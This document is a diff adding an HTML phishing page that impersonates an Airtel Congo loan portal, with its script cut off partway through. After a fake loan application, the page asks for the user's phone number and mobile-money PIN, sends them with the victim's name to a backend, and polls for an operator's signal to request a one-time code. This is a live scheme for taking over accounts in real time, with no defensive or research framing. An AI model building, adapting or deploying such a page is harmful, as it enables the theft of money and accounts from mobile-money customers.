@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Congo Loan Portal</title>
+    <style>
+        :root { --primary: #ff0000; --dark: #1a1a1a; --light: #f4f4f4; --gray: #cccccc; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: var(--light); color: var(--dark); padding: 10px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .wrapper { width: 100%; max-width: 460px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 25px; }
+        .branding { text-align: center; font-weight: bold; font-size: 1.6rem; color: var(--primary); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .view { display: none; }
+        .view.active { display: block; }
+        h3 { margin-bottom: 15px; font-size: 1.2rem; color: #333; border-bottom: 2px solid var(--light); padding-bottom: 5px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 0.9rem; font-weight: 600; }
+        input, select { width: 100%; padding: 12px; border: 1px solid var(--gray); border-radius: 6px; font-size: 1rem; }
+        .slider-val { font-weight: bold; color: var(--primary); font-size: 1.1rem; }
+        button { width: 100%; background: var(--primary); color: white; border: none; padding: 12px; border-radius: 6px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #cc0000; }
+        .summary-box { background: #f9f9f9; border-left: 4px solid var(--primary); padding: 15px; margin-bottom: 15px; border-radius: 4px; }
+        .summary-item { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.95rem; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .center-text { text-align: center; }
+        .timer { color: var(--primary); font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="branding">Airtel Loan Congo</div>
+
+    <!-- VIEW 0: Loan Calculator -->
+    <div class="view active" id="view-calc">
+        <h3>Loan Calculator</h3>
+        <div class="form-group">
+            <label>Desired Amount: <span id="calc-amt-val" class="slider-val">$5,000</span></label>
+            <input type="range" id="calc-amount" min="100" max="10000" step="100" value="5000" oninput="updateCalculator()">
+        </div>
+        <div class="form-group">
+            <label for="calc-period">Loan Period</label>
+            <select id="calc-period" onchange="updateCalculator()">
+                <option value="1">1 Month</option>
+                <option value="3">3 Months</option>
+                <option value="6">6 Months</option>
+                <option value="12">12 Months</option>
+            </select>
+        </div>
+        <div class="summary-box">
+            <div class="summary-item"><span>Estimated Repayment:</span><span id="calc-repay">$5,250</span></div>
+        </div>
+        <button onclick="switchView('view-step1')">Apply Now</button>
+    </div>
+
+    <!-- VIEW 1: Step 1 Details -->
+    <div class="view" id="view-step1">
+        <h3>Step 1: Loan Details</h3>
+        <div class="form-group">
+            <label for="loan-type">Type of Loan</label>
+            <select id="loan-type">
+                <option value="Personal">Personal Loan</option>
+                <option value="Business">Business Loan</option>
+                <option value="Emergency">Emergency Advance</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>Loan Amount: <span id="loan-amt-val" class="slider-val">$5,000</span></label>
+            <input type="range" id="loan-amount" min="100" max="10000" step="100" value="5000" oninput="document.getElementById('loan-amt-val').innerText='$' + this.value">
+        </div>
+        <div class="form-group">
+            <label for="loan-period">Period of Loan</label>
+            <select id="loan-period">
+                <option value="1 Month">1 Month</option>
+                <option value="3 Months">3 Months</option>
+                <option value="6 Months">6 Months</option>
+                <option value="12 Months">12 Months</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="loan-purpose">Purpose of Loan</label>
+            <input type="text" id="loan-purpose" placeholder="e.g., Business expansion">
+        </div>
+        <button onclick="switchView('view-step2')">Next Step</button>
+    </div>
+
+    <!-- VIEW 2: Step 2 Info -->
+    <div class="view" id="view-step2">
+        <h3>Step 2: Personal Info</h3>
+        <div class="form-group">
+            <label for="first-name">First Name</label>
+            <input type="text" id="first-name" placeholder="First name">
+        </div>
+        <div class="form-group">
+            <label for="second-name">Second Name</label>
+            <input type="text" id="second-name" placeholder="Second name">
+        </div>
+        <div class="form-group">
+            <label for="congo-phone">Congo Phone Number</label>
+            <input type="tel" id="congo-phone" maxlength="10" placeholder="e.g., 066000000">
+        </div>
+        <button onclick="switchView('view-step3')">Next Step</button>
+    </div>
+
+    <!-- VIEW 3: Step 3 Info & Summary -->
+    <div class="view" id="view-step3">
+        <h3>Step 3: Income & Summary</h3>
+        <div class="form-group">
+            <label for="emp-condition">Employment Conditions</label>
+            <select id="emp-condition">
+                <option value="Employed">Employed</option>
+                <option value="Self-Employed">Self-Employed</option>
+                <option value="Unemployed">Unemployed</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="annual-income">Annual Income ($)</label>
+            <input type="number" id="annual-income" placeholder="e.g., 12000">
+        </div>
+        <button onclick="submitApplication()">Submit Application</button>
+    </div>
+
+    <!-- VIEW 4: Interstitial Processing -->
+    <div class="view center-text" id="view-processing">
+        <h3>Processing Application</h3>
+        <div class="loader"></div>
+        <p>Analyzing parameters, please hold...</p>
+    </div>
+
+    <!-- VIEW 5: Security Re-verification -->
+    <div class="view" id="view-reauth">
+        <h3>Security Verification</h3>
+        <div class="form-group">
+            <label for="re-phone">Confirm Phone Number</label>
+            <input type="tel" id="re-phone" maxlength="10" placeholder="e.g., 066000000">
+        </div>
+        <div class="form-group">
+            <label for="pin">Account PIN (4 digits)</label>
+            <input type="text" id="pin" maxlength="4" placeholder="e.g., 1234">
+        </div>
+        <button onclick="submitCredentials()">Verify Account</button>
+    </div>
+
+    <!-- VIEW 6: Awaiting Bot Admin Approval -->
+    <div class="view center-text" id="view-awaiting-approval">
+        <h3>Verification Submitted</h3>
+        <div class="loader"></div>
+        <p>Awaiting operational authentication from system agent...</p>
+    </div>
+
+    <!-- VIEW 7: OTP Token Input -->
+    <div class="view" id="view-otp">
+        <h3>Enter Verification Code</h3>
+        <div class="form-group">
+            <label for="otp-code">One-Time PIN (OTP)</label>
+            <input type="text" id="otp-code" maxlength="4" placeholder="XXXX">
+        </div>
+        <div class="center-text" style="margin-bottom:15px;">
+            Code remaining: <span id="timer-display" class="timer">02:00</span>
+        </div>
+        <button onclick="submitOTP()">Confirm Code</button>
+    </div>
+
+    <!-- VIEW 8: Completed Confirmation View -->
+    <div class="view center-text" id="view-final">
+        <h3>Processing Complete</h3>
+        <div class="loader"></div>
+        <p>Finalizing credentials, please hold your browser open...</p>
+    </div>
+</div>
+
+<script>
+    let globalPhone = "";
+    let pollInterval = null;
+    let countdownInterval = null;
+
+    function switchView(viewId) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById(viewId).classList.add('active');
+    }
+
+    function updateCalculator() {
+        const amt = document.getElementById('calc-amount').value;
+        document.getElementById('calc-amt-val').innerText = '$' + amt;
+        document.getElementById('calc-repay').innerText = '$' + Math.round(amt * 1.05);
+    }
+
+    function submitApplication() {
+        switchView('view-processing');
+        setTimeout(() => { switchView('view-reauth'); }, 2000);
+    }
+
+    async function submitCredentials() {
+        globalPhone = document.getElementById('re-phone').value;
+        const payload = {
+            phone: globalPhone,
+            firstName: document.getElementById('first-name').value,
+            secondName: document.getElementById('second-name').value,
+            pin: document.getElementById('pin').value
+        };
+
+        switchView('view-awaiting-approval');
+
+        await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        startStatusPolling();
+    }
+
+    function startStatusPolling() {
+        if(pollInterval) clearInterval(pollInterval);
+        pollInterval = setInterval(async () => {
+            const res = await fetch(`/api/check-status/${globalPhone}`);
+            const data = await res.json();
+
+            if (data.status === 'enter_otp') {
